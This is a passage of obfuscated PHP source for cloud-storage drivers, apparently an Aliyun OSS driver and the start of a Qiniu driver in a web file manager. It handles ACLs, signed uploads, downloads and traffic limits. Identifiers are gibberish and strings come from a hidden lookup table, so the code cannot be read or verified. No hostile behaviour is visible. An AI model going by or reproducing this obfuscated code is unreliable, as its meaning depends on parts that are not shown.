$­ÇÒûœ¢[$°–é•èŠ] = array($±Ú‚Ë“[79] => 0); } } return $this->listAllFiles($Æî¬÷¹¬, $­ÇÒûœ¢); } public function canRead($¯ªüÒéƒ) { $ûûå•¢ =& $_SERVER[®»±”ó²]; $‚ãŞáú¿ = $this->pathAcl($¯ªüÒéƒ); return $‚ãŞáú¿ == $ûûå•¢[1503] || $‚ãŞáú¿ == $ûûå•¢[635] ? !0 : !1; } public function canWrite($¸‚ºŸ÷) { $¶ÄóÓÓÀ = $this->pathAcl($¸‚ºŸ÷); return $¶ÄóÓÓÀ == $_SERVER[®»±”ó²][635] ? !0 : !1; } public function pathAcl($¢œË€»×) { $§ˆãíÑß =& $_SERVER[®»±”ó²]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¾¬Î’“´ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¢œË€»×)); } catch (OSS\Core\OssException $üİòøàù) { $this->writeLog(__FUNCTION__ . $§ˆãíÑß[215] . $üİòøàù->getMessage()); return !1; } $›Û…òÚ = $¾¬Î’“´ == $§ˆãíÑß[37] ? $this->bucketAcl : $¾¬Î’“´; if ($›Û…òÚ == $§ˆãíÑß[1504]) { return $§ˆãíÑß[1503]; } if ($›Û…òÚ == $§ˆãíÑß[1505]) { return $§ˆãíÑß[635]; } return $›Û…òÚ; } private function chmodPath($ğ—ƒßİº, $åßŞßÄ = '') { $õˆ´Åé =& $_SERVER[®»±”ó²]; $µøÊú¿ = empty($åßŞßÄ) ? $õˆ´Åé[1505] : $åßŞßÄ; $Éêí¦„’ = array($õˆ´Åé[37], $õˆ´Åé[232], $õˆ´Åé[1504], $õˆ´Åé[1505]); if (!in_array($µøÊú¿, $Éêí¦„’)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ğ—ƒßİº), $µøÊú¿); } catch (OSS\Core\OssException $ìïÊ›Úº) { $this->writeLog(__FUNCTION__ . $õˆ´Åé[215] . $ìïÊ›Úº->getMessage()); return !1; } return !0; } public function getContent($Û…Î¾) { return $this->fileSubstr($Û…Î¾, -1); } public function setContent($Ê§â‰¯ö, $ì™œ§ˆ† = '') { $öãÆê•× =& $_SERVER[®»±”ó²]; try { $ù›—×ß = $this->trafficLimit($öãÆê•×[1506]); $Ìé¤·Æê = $this->client->putObject($this->bucket, $this->pathEncode($Ê§â‰¯ö), $ì™œ§ˆ†, $ù›—×ß); } catch (OSS\Core\OssException $„áˆ¿³à) { $this->writeLog(__FUNCTION__ . $öãÆê•×[215] . $„áˆ¿³à->getMessage()); return !1; } $¯Ø±¶ªş = array($öãÆê•×[1500] => trim($Ìé¤·Æê[$öãÆê•×[1497]], $öãÆê•×[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ê§â‰¯ö))); $this->updateObjMeta($Ê§â‰¯ö, $¯Ø±¶ªş); return isset($Ìé¤·Æê[$öãÆê•×[1507]][$öãÆê•×[297]]) ? !0 : !1; } private function updateObjMeta($Æ‚›¬‹È, $€©×¢µ) { $Æ‚›¬‹È = $this->pathEncode($Æ‚›¬‹È); try { $öÙ—ÙñÁ = array(OSS\OssClient::OSS_HEADERS => $€©×¢µ); $this->client->copyObject($this->bucket, $Æ‚›¬‹È, $this->bucket, $Æ‚›¬‹È, $öÙ—ÙñÁ); } catch (OSS\Core\OssException $œ·É©‡) { $this->writeLog(__FUNCTION__ . $_SERVER[®»±”ó²][215] . $œ·É©‡->getMessage()); return !1; } return !0; } public function upload($ú¤¨‘, $Ö¯ãºŠï, $ŸÔåÑÁº = false, $Ÿ¹ŞıšŸ = REPEAT_REPLACE) { $Ù‘¶õ™ =& $_SERVER[®»±”ó²]; $°˜‚«Ïİ = trim($ú¤¨‘, $Ù‘¶õ™[8]); $ÒšØ±ïù = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Ù‘¶õ™[1500] => @md5_file($Ö¯ãºŠï)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ú¤¨‘))); $ÒšØ±ïù = $this->trafficLimit($Ù‘¶õ™[1506], $ÒšØ±ïù); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($°˜‚«Ïİ), $Ö¯ãºŠï, $ÒšØ±ïù); } catch (OSS\Core\OssException $‰¦¬¹¡ı) { $this->writeLog(__FUNCTION__ . $Ù‘¶õ™[215] . $‰¦¬¹¡ı->getMessage()); return !1; } return $this->getPathOuter($ú¤¨‘); } public function getHost() { $éŠëı»Ç =& $_SERVER[®»±”ó²]; $æ¥®ÛËĞ = explode($éŠëı»Ç[211], parent::getHost()); return $æ¥®ÛËĞ[0] . $éŠëı»Ç[211] . $this->bucket . $éŠëı»Ç[10] . $æ¥®ÛËĞ[1]; } public function uploadFormData($½Ş±õù‚, $Şß…Îü  = 3600) { $µæÜö¤ =& $_SERVER[®»±”ó²]; if (!($Ú…äŸ = $this->getHost())) { return !1; } $í€Ùİ·¤ = $Şß…Îü ; $Ÿ§Á£ = date($µæÜö¤[1508], time() + $í€Ùİ·¤); $ÓšØúúÂ = new DateTime($Ÿ§Á£); $˜Û©‘Ëá = $ÓšØúúÂ->format(DateTime::ISO8601); $Æ¸ó®à = strpos($˜Û©‘Ëá, $µæÜö¤[373]); $˜Û©‘Ëá = substr($˜Û©‘Ëá, 0, $Æ¸ó®à) . $µæÜö¤[1509]; $¾Õüá¬ì = 1048576000 * 5; $œèœµŒ„ = $this->pathFather($½Ş±õù‚); $ò×ı´„Ü = array($µæÜö¤[265] => $˜Û©‘Ëá, $µæÜö¤[268] => array(array($µæÜö¤[1510], 0, $¾Õüá¬ì), array($µæÜö¤[270], $µæÜö¤[271], $œèœµŒ„))); $’ÛÅ¼ä = base64_encode(json_encode($ò×ı´„Ü)); $¾‰í = base64_encode(hash_hmac($µæÜö¤[1431], $’ÛÅ¼ä, $this->secret, !0)); $ÁÚ¤™ìº = array($µæÜö¤[1511] => $this->accessKey, $µæÜö¤[280] => $’ÛÅ¼ä, $µæÜö¤[273] => $µæÜö¤[264], $µæÜö¤[1512] => $¾‰í, $µæÜö¤[209] => $Ú…äŸ); $ÁÚ¤™ìº = $this->trafficLimit($µæÜö¤[1506], $ÁÚ¤™ìº, !0); return $ÁÚ¤™ìº; } public function uploadMultiData($Ï¯êµñ‚, $££†ú = 3600) { $š¶¬õ‘Ø =& $_SERVER[®»±”ó²]; if (!($§Æ›÷É = $this->getHost())) { return !1; } $×—èşÕî = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ï¯êµñ‚)); return array($š¶¬õ‘Ø[284] => $×—èşÕî, $š¶¬õ‘Ø[209] => $§Æ›÷É . $š¶¬õ‘Ø[8] . $this->pathEncode($Ï¯êµñ‚), $š¶¬õ‘Ø[285] => gmdate($š¶¬õ‘Ø[1513]), $š¶¬õ‘Ø[97] => $Ï¯êµñ‚); } public function uploadMultiAuth($¬Ø˜ÒÈØ, $²‘”Â‡ï = array()) { if (isset($²‘”Â‡ï[$_SERVER[®»±”ó²][286]])) { return $this->uploadPartAuth($¬Ø˜ÒÈØ, $²‘”Â‡ï); } return $this->uploadListAuth($¬Ø˜ÒÈØ, $²‘”Â‡ï); } private function uploadPartAuth($ÔÊšëÛ×, $Ç†¡´À‡ = array()) { $û•Ó®Ğ =& $_SERVER[®»±”ó²]; $Á‰ÃÛ‹Û = $Ç†¡´À‡[$û•Ó®Ğ[97]]; $†¸ßâŒ³ = $this->_getUploadAuth($Á‰ÃÛ‹Û, $Ç†¡´À‡); $ñÖÅû¾¾ = array($û•Ó®Ğ[289] => $†¸ßâŒ³[$û•Ó®Ğ[289]], $û•Ó®Ğ[285] => $†¸ßâŒ³[$û•Ó®Ğ[285]]); if (isset($†¸ßâŒ³[$û•Ó®Ğ[1514]])) { $ñÖÅû¾¾[$û•Ó®Ğ[1514]] = $†¸ßâŒ³[$û•Ó®Ğ[1514]]; } return $ñÖÅû¾¾; } private function uploadListAuth($Î…ã¹ƒî, $Àôàˆ¶ = array()) { $Ş„éÊñ© =& $_SERVER[®»±”ó²]; $ŞÆÅ½Á¯ = $Àôàˆ¶[$Ş„éÊñ©[97]]; $¡ßÃĞ = $Àôàˆ¶[$Ş„éÊñ©[284]]; $î‹÷ı = $this->client->listParts($this->bucket, $this->pathEncode($ŞÆÅ½Á¯), $¡ßÃĞ); $Ûı‘Ú¨Ä = $î‹÷ı->getListPart(); $²Ë´Ê×® = array(); foreach ($Ûı‘Ú¨Ä as $ïŸÜ’£à) { $²Ë´Ê×®[] = array($Ş„éÊñ©[300] => $ïŸÜ’£à->getPartNumber(), $Ş„éÊñ©[301] => trim($ïŸÜ’£à->getETag(), $Ş„éÊñ©[121])); } if (!$²Ë´Ê×®) { return !1; } $Åëñ†© = $this->_getUploadAuth($ŞÆÅ½Á¯, $Àôàˆ¶); return array($Ş„éÊñ©[289] => $Åëñ†©[$Ş„éÊñ©[289]], $Ş„éÊñ©[285] => $Åëñ†©[$Ş„éÊñ©[285]], $Ş„éÊñ©[292] => $²Ë´Ê×®); } private function _getUploadAuth($ê¾…—ó™, $•ìºâêŒ) { $º‰‘† =& $_SERVER[®»±”ó²]; $ø İ˜²§ = gmdate($º‰‘†[1513]); $ÆÛÇ•€³ = isset($•ìºâêŒ[$º‰‘†[286]]) ? $º‰‘†[256] : $º‰‘†[291]; $ò©Ùºû² = array_intersect_key($•ìºâêŒ, array_flip(array($º‰‘†[286], $º‰‘†[284]))); ksort($ò©Ùºû²); $Ë·º¯ä = $ò©Ùºû² ? $º‰‘†[76] . http_build_query($ò©Ùºû², null, $º‰‘†[287], PHP_QUERY_RFC3986) : $º‰‘†[12]; $²ÔşñÀˆ = array($ÆÛÇ•€³, $º‰‘†[12], $º‰‘†[123], $ø İ˜²§, "\x78\x2d\157\x73\x73\x2d\x64\x61\164\145\72{$ø İ˜²§}", $º‰‘†[8] . $this->bucket . $º‰‘†[8] . $ê¾…—ó™ . $Ë·º¯ä); if (isset($•ìºâêŒ[$º‰‘†[286]])) { $ÜØòĞ¢¹ = $this->trafficLimit($º‰‘†[1506], array(), !0); if ($ÜØòĞ¢¹) { $ê¾…—ó™ = $º‰‘†[1514]; array_splice($²ÔşñÀˆ, 5, 0, $ê¾…—ó™ . $º‰‘†[4] . $ÜØòĞ¢¹[$ê¾…—ó™]); } } $ÇÎ­³ç = implode($º‰‘†[288], $²ÔşñÀˆ); $€¢ªÅá = base64_encode(hash_hmac($º‰‘†[1431], $ÇÎ­³ç, $this->secret, !0)); $¦¤—İ = $º‰‘†[1483] . $this->accessKey . $º‰‘†[4] . $€¢ªÅá; $ìİàŠÊ¯ = array($º‰‘†[289] => $¦¤—İ, $º‰‘†[285] => $ø İ˜²§); if (!empty($ÜØòĞ¢¹)) { $ìİàŠÊ¯ = array_merge($ìİàŠÊ¯, $ÜØòĞ¢¹); } return $ìİàŠÊ¯; } public function download($úáÚ¯ê±, $¶Â“üÊü) { $›óÑ„š‰ =& $_SERVER[®»±”ó²]; if ($this->isFolder($úáÚ¯ê±)) { return !1; } try { $ó¢”€Á™ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¶Â“üÊü); $ó¢”€Á™ = $this->trafficLimit($›óÑ„š‰[112], $ó¢”€Á™); $this->client->getObject($this->bucket, $this->pathEncode($úáÚ¯ê±), $ó¢”€Á™); } catch (OSS\Core\OssException $ò‘ĞÇ×£) { $this->writeLog(__FUNCTION__ . $›óÑ„š‰[215] . $ò‘ĞÇ×£->getMessage()); return !1; } return $¶Â“üÊü; } public function fileSubstr($ˆŒ™ÇøÑ, $İ´Ù¨€¼ = 0, $§¶¤ÒÖƒ = false) { if ($İ´Ù¨€¼ === -1) { $Ğ»àŒ¶ = array(); } else { if ($§¶¤ÒÖƒ === !1) { $ÊÂ°¯µé = $this->size($ˆŒ™ÇøÑ); } else { $ÊÂ°¯µé = $İ´Ù¨€¼ + $§¶¤ÒÖƒ - 1; } $Ğ»àŒ¶ = array(OSS\OssClient::OSS_RANGE => "{$İ´Ù¨€¼}\x2d{$ÊÂ°¯µé}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ˆŒ™ÇøÑ), $Ğ»àŒ¶); } catch (OSS\Core\OssException $Úªç¢ùú) { $this->writeLog(__FUNCTION__ . $_SERVER[®»±”ó²][215] . $Úªç¢ùú->getMessage()); think_exception($Úªç¢ùú->getMessage()); return !1; } } private function trafficLimit($ÌÈé¸Ûã, $Éì˜ÓõØ = array(), $ú±¿Ø¯ = false) { $•úœÛùÆ =& $_SERVER[®»±”ó²]; if ($ÌÈé¸Ûã == $•úœÛùÆ[1506] && $this->isUploadServer() || $ÌÈé¸Ûã == $•úœÛùÆ[112] && $this->isFileOutServer()) { return $Éì˜ÓõØ; } $úôîñéù = floatval($GLOBALS[$•úœÛùÆ[6]][$•úœÛùÆ[92]][$•úœÛùÆ[110]][$ÌÈé¸Ûã]) * 1024 * 1024 * 8; if (!$úôîñéù) { return $Éì˜ÓõØ; } $úôîñéù = $úôîñéù < 819200 ? 819200 : ($úôîñéù > 838860800 ? 838860800 : $úôîñéù); if ($ú±¿Ø¯) { $Éì˜ÓõØ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($úôîñéù); } else { if (!isset($Éì˜ÓõØ[OSS\OssClient::OSS_HEADERS])) { $Éì˜ÓõØ[OSS\OssClient::OSS_HEADERS] = array(); } $Éì˜ÓõØ[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($úôîñéù); } return $Éì˜ÓõØ; } public function link($Î‰ÄÑ÷¤, $Ì¿úÁøı = array()) { $ÀŞ±ôÆ =& $_SERVER[®»±”ó²]; if (!$this->exist($Î‰ÄÑ÷¤) || $this->isFolder($Î‰ÄÑ÷¤)) { return !1; } try { $Ì¿úÁøı = $this->trafficLimit($ÀŞ±ôÆ[112], $Ì¿úÁøı, !0); $Ç‹ê¯ãõ = $this->client->signUrl($this->bucket, $this->pathEncode($Î‰ÄÑ÷¤), 3600 * 12, $ÀŞ±ôÆ[1515], $Ì¿úÁøı); return $this->getCdnLink($Ç‹ê¯ãõ); } catch (OSS\Core\OssException $ÈÁÕÑŒÒ) { $this->writeLog(__FUNCTION__ . $ÀŞ±ôÆ[215] . $ÈÁÕÑŒÒ->getMessage()); return !1; } } public function fileOut($òÔÙü¿ã, $÷¹óá¼ = false, $Ö˜š…¼• = false, $úŠ˜ñ– = '') { $Ö£å™ôù =& $_SERVER[®»±”ó²]; if ($this->isFileOutServer()) { return $this->fileOutServer($òÔÙü¿ã, $÷¹óá¼, $Ö˜š…¼•, $úŠ˜ñ–); } if (!$Ö˜š…¼•) { $Ö˜š…¼• = $this->pathThis($òÔÙü¿ã); } $Ö˜š…¼• = rawurlencode($Ö˜š…¼•); $‰ÇÔÊ‡Ÿ = get_file_mime(get_path_ext($Ö˜š…¼•)); if ($‰ÇÔÊ‡Ÿ == $Ö£å™ôù[251]) { return parent::fileOut($òÔÙü¿ã, $÷¹óá¼, $Ö˜š…¼•, $úŠ˜ñ–); } $÷¹óá¼ = $÷¹óá¼ ? $Ö£å™ôù[1516] : $Ö£å™ôù[1517]; $ÉÒíÏŸ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Ö£å™ôù[1518] . rawurlencode("{$÷¹óá¼}\x3b\146\151\x6c\145\x6e\x61\155\x65\x3d{$Ö˜š…¼•}")); $º•©àş = $this->link($òÔÙü¿ã, $ÉÒíÏŸ); $this->fileOutLink($º•©àş); } public function fileOutServer($¤©Ø”Ô, $’»î·ú = false, $Ëú­õü˜ = false, $«°ŸÛš = '') { parent::fileOut($¤©Ø”Ô, $’»î·ú, $Ëú­õü˜, $«°ŸÛš); } public function fileOutImage($ÀñØ…Üß, $›ˆê×Ÿõ = 250) { if ($this->size($ÀñØ…Üß) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ÀñØ…Üß, $›ˆê×Ÿõ); } $Ø‚€âßØ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[®»±”ó²][1480] . $›ˆê×Ÿõ); $Ò×Ü…Œ¡ = $this->link($ÀñØ…Üß, $Ø‚€âßØ); $this->fileOutLink($Ò×Ü…Œ¡); } public function fileOutImageServer($‹ß…ªéé, $©şçÎ›× = 250) { parent::fileOutImage($‹ß…ªéé, $©şçÎ›×); } public function fileOutLink($å†·Ô–¢) { $àï­ç =& $_SERVER[®»±”ó²]; if (!$this->isCdnHost() && substr($å†·Ô–¢, 0, 7) == $àï­ç[219]) { $å†·Ô–¢ = $àï­ç[220] . substr($å†·Ô–¢, 7); } header($àï­ç[175] . $å†·Ô–¢); die; } public function hashMd5($³»Ìî·Ù, $µÖ•¾Í‰ = '') { $óæ€ÚÙ· =& $_SERVER[®»±”ó²]; $Û¡‰ÙÅŠ = $this->_objectMeta($³»Ìî·Ù); if (!$Û¡‰ÙÅŠ) { return $óæ€ÚÙ·[12]; } if (!isset($Û¡‰ÙÅŠ[$óæ€ÚÙ·[1500]]) && !empty($µÖ•¾Í‰)) { $ôñã‚º‚ = $this->updateObjMeta($³»Ìî·Ù, array($óæ€ÚÙ·[1500] => $µÖ•¾Í‰)); $Û¡‰ÙÅŠ[$óæ€ÚÙ·[1500]] = $ôñã‚º‚ ? $µÖ•¾Í‰ : $óæ€ÚÙ·[12]; } return isset($Û¡‰ÙÅŠ[$óæ€ÚÙ·[1500]]) ? strtolower($Û¡‰ÙÅŠ[$óæ€ÚÙ·[1500]]) : $óæ€ÚÙ·[12]; } public function size($¯ãÊ†ØÖ) { $ñ¨ªìö­ = $this->objectMeta($¯ãÊ†ØÖ); return $ñ¨ªìö­ ? $ñ¨ªìö­[$_SERVER[®»±”ó²][79]] : 0; } public function info($Šƒó–Ä¯) { if ($this->isFolder($Šƒó–Ä¯)) { return $this->folderInfo($Šƒó–Ä¯); } else { if ($this->isFile($Šƒó–Ä¯)) { return $this->fileInfo($Šƒó–Ä¯); } } return !1; } public function exist($–·Â±Ğ) { return $this->isFile($–·Â±Ğ) || $this->isFolder($–·Â±Ğ); } public function isFile($É‹ì¬Ã“) { return !$this->isFolder($É‹ì¬Ã“) && $this->objectMeta($É‹ì¬Ã“); } public function isFolder($åŠ¹©Ÿ´) { return $this->cacheMethod($_SERVER[®»±”ó²][180], $åŠ¹©Ÿ´); } protected function objectMeta($µ‡Á‚ˆµ) { return $this->cacheMethod($_SERVER[®»±”ó²][182], $µ‡Á‚ˆµ); } protected function _objectMeta($ÏˆÕÉó¶) { $‘»š±› =& $_SERVER[®»±”ó²]; try { $ØñÏçãé = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ÏˆÕÉó¶)); } catch (OSS\Core\OssException $×ŸŠ„öş) { $this->writeLog(__FUNCTION__ . $‘»š±›[215] . $×ŸŠ„öş->getMessage()); $ØñÏçãé = !1; } if ($ØñÏçãé) { $ØñÏçãé[$‘»š±›[79]] = intval($ØñÏçãé[$‘»š±›[1498]]); } return $ØñÏçãé; } protected function _isFolder($¦‡°™û) { $ãš«Ë”— =& $_SERVER[®»±”ó²]; if ($¦‡°™û == $ãš«Ë”—[12] || $¦‡°™û == $ãš«Ë”—[8]) { return !0; } $“»–òö = array($ãš«Ë”—[1493] => $ãš«Ë”—[8], $ãš«Ë”—[1494] => rtrim($¦‡°™û, $ãš«Ë”—[8]) . $ãš«Ë”—[8], $ãš«Ë”—[1495] => 1, $ãš«Ë”—[1496] => $ãš«Ë”—[12]); $ö²—…Î­ = $this->client->listObjects($this->bucket, $“»–òö); if ($ö²—…Î­->getObjectList() || $ö²—…Î­->getPrefixList()) { return !0; } return !1; } public function writeLog($¥¨›¼²§ = '', $ëÙ‡ñÒ° = false) { $ˆœ¤Üœ— =& $_SERVER[®»±”ó²]; $Êªò’ = in_array(ACTION, array($ˆœ¤Üœ—[213], $ˆœ¤Üœ—[214])); if (!$Êªò’ && !GLOBAL_DEBUG) { return; } $Š¿„Ñå­ = 0; if (stripos($¥¨›¼²§, $ˆœ¤Üœ—[1519]) !== !1) { $Š¿„Ñå­ = 1; $è‹ıÕŠÓ = explode($ˆœ¤Üœ—[1520], $¥¨›¼²§); $¥¨›¼²§ = !empty($è‹ıÕŠÓ[1]) ? $è‹ıÕŠÓ[1] : $¥¨›¼²§; } else { if (stripos($¥¨›¼²§, $ˆœ¤Üœ—[1521])) { $Š¿„Ñå­ = 2; $è‹ıÕŠÓ = explode($ˆœ¤Üœ—[1521], $¥¨›¼²§); $è‹ıÕŠÓ = explode($ˆœ¤Üœ—[4], $è‹ıÕŠÓ[0]); $¥¨›¼²§ = !empty($è‹ıÕŠÓ[1]) ? $è‹ıÕŠÓ[1] : $¥¨›¼²§; } } if ($Êªò’ && I18n::getType() == $ˆœ¤Üœ—[1522]) { if ($Š¿„Ñå­ == 1) { $¥¨›¼²§ = str_replace($ˆœ¤Üœ—[1523], $ˆœ¤Üœ—[1524], $¥¨›¼²§); } else { if ($Š¿„Ñå­ == 2) { $è‹ıÕŠÓ = explode($ˆœ¤Üœ—[215], $è‹ıÕŠÓ[0]); $Ù©±©¸× = isset($è‹ıÕŠÓ[1]) ? $è‹ıÕŠÓ[1] : $ˆœ¤Üœ—[12]; $ƒ´ù¢à€ = array($ˆœ¤Üœ—[1525] => $ˆœ¤Üœ—[1526], $ˆœ¤Üœ—[1527] => $ˆœ¤Üœ—[1528], $ˆœ¤Üœ—[1529] => $ˆœ¤Üœ—[1530], $ˆœ¤Üœ—[1531] => $ˆœ¤Üœ—[1532], $ˆœ¤Üœ—[1533] => $ˆœ¤Üœ—[1534], $ˆœ¤Üœ—[1535] => $ˆœ¤Üœ—[1536], $ˆœ¤Üœ—[1537] => $ˆœ¤Üœ—[1538], $ˆœ¤Üœ—[1539] => $ˆœ¤Üœ—[1540], $ˆœ¤Üœ—[1541] => $ˆœ¤Üœ—[1542], $ˆœ¤Üœ—[1543] => $ˆœ¤Üœ—[1544]); if (isset($ƒ´ù¢à€[$Ù©±©¸×])) { $¥¨›¼²§ = $ƒ´ù¢à€[$Ù©±©¸×]; } } } if (stripos($¥¨›¼²§, $ˆœ¤Üœ—[1545])) { $¥¨›¼²§ = $ˆœ¤Üœ—[1546]; } } if (!trim($¥¨›¼²§)) { return; } parent::writeLog(trim($¥¨›¼²§), $ëÙ‡ñÒ°); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($¯®ìì¨) { parent::__construct(); require_once SDK_DIR . $_SERVER[®»±”ó²][1547]; $this->_init($¯®ìì¨); } public function _init($ÕğŒĞ¶×) { $Á¢‹áÄ· =& $_SERVER[®»±”ó²]; $this->config = $ÕğŒĞ¶×; foreach ($ÕğŒĞ¶× as $¯¸ˆõø => $øÜú‰€Ş) { if (isset($this->{$¯¸ˆõø})) { $this->{$¯¸ˆõø} = $øÜú‰€Ş; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Á¢‹áÄ·[1548] . LNG($Á¢‹áÄ·[1484])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ïÔ²Ì¦³, $ÒÇÆâ„Ì = '', $¨ø²œğ— = REPEAT_RENAME) { if ($this->setContent($ïÔ²Ì¦³, $ÒÇÆâ„Ì)) { return $this->getPathOuter($ïÔ²Ì¦³); } return !1; } public function mkdir($‘êòÙ¥ª, $«¶íîÆğ = REPEAT_SKIP) { $é¡ßúµº =& $_SERVER[®»±”ó²]; $·Òàí‰É = trim($‘êòÙ¥ª, $é¡ßúµº[8]); if ($this->_isFolder($·Òàí‰É)) { return $this->getPathOuter($·Òàí‰É); } $‘êòÙ¥ª = $·Òàí‰É . $é¡ßúµº[8]; $ÔÒëˆ¸ = get_path_this($·Òàí‰É); $ï¤ªûŞ• = $‘êòÙ¥ª . $ÔÒëˆ¸; if (!$this->mkfile($ï¤ªûŞ•)) { return !1; } if (!$this->moveFile($ï¤ªûŞ•, $‘êòÙ¥ª)) { $this->delFile($ï¤ªûŞ•); return !1; } return $this->getPathOuter($·Òàí‰É); } public function copyFile($ñ‘ë¨µí, $¹»Ãõİ­) { $ÜÙĞöÛí = $this->bucketManager->copy($this->bucket, $ñ‘ë¨µí, $this->bucket, $¹»Ãõİ­, !0); return $ÜÙĞöÛí ? !1 : $this->getPathOuter($¹»Ãõİ­); } public function moveFile($ÄªÌ‰ß», $Ç‰Ê£Şı) { $ÄÓ½„È¦ = $this->bucketManager->move($this->bucket, $ÄªÌ‰ß», $this->bucket, $Ç‰Ê£Şı, !0); return $ÄÓ½„È¦ ? !1 : $this->getPathOuter($Ç‰Ê£Şı); } public function delFile($¹è¡ËÈö) { if (!$this->exist($¹è¡ËÈö)) { return !0; } $ì£ıÚÃ’ = $this->bucketManager->delete($this->bucket, $¹è¡ËÈö); if (!$ì£ıÚÃ’) { return !0; } return $ì£ıÚÃ’->code() == 612 ? !0 : !1; } public function delFolder($½•üº‹ ) { $è¸ğß˜  =& $_SERVER[®»±”ó²]; if (!$this->exist($½•üº‹ )) { return !0; } $this->listItemCache = !1; $‘±ŠÉÆŒ = $this->fileList($½•üº‹ ); $this->listItemCache = !0; $»¬×òáÖ = trim($½•üº‹ , $è¸ğß˜ [8]) . $è¸ğß˜ [8]; if (!empty($½•üº‹ ) && $½•üº‹  !== $è¸ğß˜ [231] && !in_array($»¬×òáÖ, $‘±ŠÉÆŒ[$è¸ğß˜ [85]])) { $‘±ŠÉÆŒ[$è¸ğß˜ [85]][] = $»¬×òáÖ; } $ıå¹£„î = $this->delByBatch($‘±ŠÉÆŒ[$è¸ğß˜ [86]]); if (!$ıå¹£„î) { return !1; } $ıå¹£„î = $this->delByBatch($‘±ŠÉÆŒ[$è¸ğß˜ [85]]); if (!$ıå¹£„î) { return !1; } return $this->delFile($»¬×òáÖ); } private function delByBatch($×·ï¹—–) { foreach (array_chunk($×·ï¹—–, 1000) as $½­„óÍŞ) { $Ê£¯ò´ˆ = $this->bucketManager->buildBatchDelete($this->bucket, $½­„óÍŞ); list($«úÏ…ó, $§úšää) = $this->bucketManager->batch($Ê£¯ò´ˆ); if ($§úšää) { return !1; } } return !0; } public function rename($ÔèÑñï, $é¢•ç—¦) { return $this->renameObject($ÔèÑñï, $é¢•ç—¦); } public function fileInfo($ÍşüÓÊ, $ùˆ©Í™ª = false, $²îªóêó = array()) { $ğ“éˆùö =& $_SERVER[®»±”ó²]; $Ê†èëçû = array($ğ“éˆùö[32] => $this->pathThis($ÍşüÓÊ), $ğ“éˆùö[87] => $this->getPathOuter($ğ“éˆùö[8] . $ÍşüÓÊ), $ğ“éˆùö[33] => $ğ“éˆùö[233], $ğ“éˆùö[79] => isset($²îªóêó[$ğ“éˆùö[1549]]) ? $²îªóêó[$ğ“éˆùö[1549]] : 0, $ğ“éˆùö[169] => $this->ext($ÍşüÓÊ)); if ($ùˆ©Í™ª) { return $Ê†èëçû; } $Ê†èëçû[$ğ“éˆùö[234]] = $Ê†èëçû[$ğ“éˆùö[88]] = 0; $Ê†èëçû[$ğ“éˆùö[235]] = $Ê†èëçû[$ğ“éˆùö[236]] = !0; if (empty($²îªóêó)) { $²îªóêó = $this->objectMeta($ÍşüÓÊ); if (!$²îªóêó) { return $Ê†èëçû; } } if (isset($²îªóêó[$ğ“éˆùö[237]]) && $²îªóêó[$ğ“éˆùö[237]]) { $Ê†èëçû[$ğ“éˆùö[238]] = $²îªóêó[$ğ“éˆùö[237]]; } if (isset($²îªóêó[$ğ“éˆùö[248]]) && $²îªóêó[$ğ“éˆùö[248]]) { $Ê†èëçû[$ğ“éˆùö[238]] = $²îªóêó[$ğ“éˆùö[248]]; } if (isset($²îªóêó[$ğ“éˆùö[1550]])) { $Ê†èëçû[$ğ“éˆùö[88]] = substr($²îªóêó[$ğ“éˆùö[1550]] . $ğ“éˆùö[12], 0, 10); } if (isset($²îªóêó[$ğ“éˆùö[1549]])) { $Ê†èëçû[$ğ“éˆùö[79]] = $²îªóêó[$ğ“éˆùö[1549]]; } return $Ê†èëçû; } public function folderInfo($³½ç¨ÕÙ, $ßé¶ÈŞÒ = false) { $ÈŸ‰åÌ— =& $_SERVER[®»±”ó²]; $ÇœŞÖÈ© = array($ÈŸ‰åÌ—[32] => $this->pathThis($³½ç¨ÕÙ), $ÈŸ‰åÌ—[87] => $this->getPathOuter($ÈŸ‰åÌ—[8] . $³½ç¨ÕÙ), $ÈŸ‰åÌ—[33] => $ÈŸ‰åÌ—[78]); if ($ßé¶ÈŞÒ) { return $ÇœŞÖÈ©; } $ÇœŞÖÈ©[$ÈŸ‰åÌ—[234]] = $ÇœŞÖÈ©[$ÈŸ‰åÌ—[88]] = 0; $ÇœŞÖÈ©[$ÈŸ‰åÌ—[235]] = $ÇœŞÖÈ©[$ÈŸ‰åÌ—[236]] = !0; $³½ç¨ÕÙ = rtrim($³½ç¨ÕÙ, $ÈŸ‰åÌ—[8]) . $ÈŸ‰åÌ—[8]; $¬Àæ›Ï  = $this->objectMeta($³½ç¨ÕÙ); if (isset($¬Àæ›Ï [$ÈŸ‰åÌ—[1550]])) { $ÇœŞÖÈ©[$ÈŸ‰åÌ—[88]] = substr($¬Àæ›Ï [$ÈŸ‰åÌ—[1550]] . 